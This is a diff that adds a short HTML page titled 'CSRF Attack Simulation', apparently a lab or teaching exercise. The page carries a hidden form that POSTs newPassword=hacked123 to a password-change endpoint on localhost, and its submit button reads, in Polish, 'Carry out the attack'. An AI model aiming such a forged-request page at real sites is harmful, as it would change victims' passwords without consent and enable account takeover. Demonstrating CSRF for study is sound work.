@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack</title>
+</head>
+<body>
+  <h1>CSRF Attack Simulation</h1>
+  <form action="http://localhost:3000/change-password" method="POST">
+    <input type="hidden" name="newPassword" value="hacked123" />
+    <button type="submit">Wykonaj atak</button>
+  </form>
+</body>
+</html>
